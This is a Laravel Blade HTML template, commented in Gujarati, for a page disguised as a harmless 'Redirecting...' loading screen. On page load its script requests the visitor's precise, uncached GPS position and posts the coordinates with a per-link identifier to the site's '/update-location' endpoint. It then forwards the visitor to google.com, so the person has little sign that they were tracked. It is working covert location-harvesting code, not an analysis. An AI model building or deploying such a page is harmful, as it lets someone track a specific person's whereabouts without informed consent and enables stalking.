<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #ffffff; 
        }
        .loader { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #555; font-size: 14px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Loading, please wait...</p>

    <script>
        window.onload = function() {
            // રીડાયરેક્ટ કરવા માટેનું ફંક્શન
            const redirectToTarget = () => {
                window.location.href = "https://google.com";
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // GPS ડેટા મળ્યા પછી સર્વર પર મોકલો
                        fetch("{{ url('/update-location') }}", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                            },
                            body: JSON.stringify({
                                id: "{{ $id }}",
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            // ડેટા સેવ થયા પછી રીડાયરેક્ટ
                            redirectToTarget();
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            redirectToTarget();
                        });
                    }, 
                    function(error) {
                        // જો યુઝર Permission ના પાડે (Deny) તો સીધું રીડાયરેક્ટ
                        console.warn("Location permission denied.");
                        redirectToTarget();
                    }, 
                    { 
                        enableHighAccuracy: true, // એકદમ સચોટ લોકેશન માટે
                        timeout: 8000,            // 8 સેકન્ડ સુધી રાહ જોશે
                        maximumAge: 0             // હંમેશા નવું લોકેશન જ લેશે (Cache માંથી નહીં)
                    }
                );
            } else {
                // જો બ્રાઉઝર જીઓલોકેશન સપોર્ટ ન કરતું હોય
                redirectToTarget();
            }

            // સુરક્ષા માટે: જો કોઈ કારણસર 10 સેકન્ડ સુધી કંઈ ના થાય, તો ઓટોમેટિક રીડાયરેક્ટ કરી દેવું
            setTimeout(redirectToTarget, 10000);
        };
    </script>
</body>
</html>
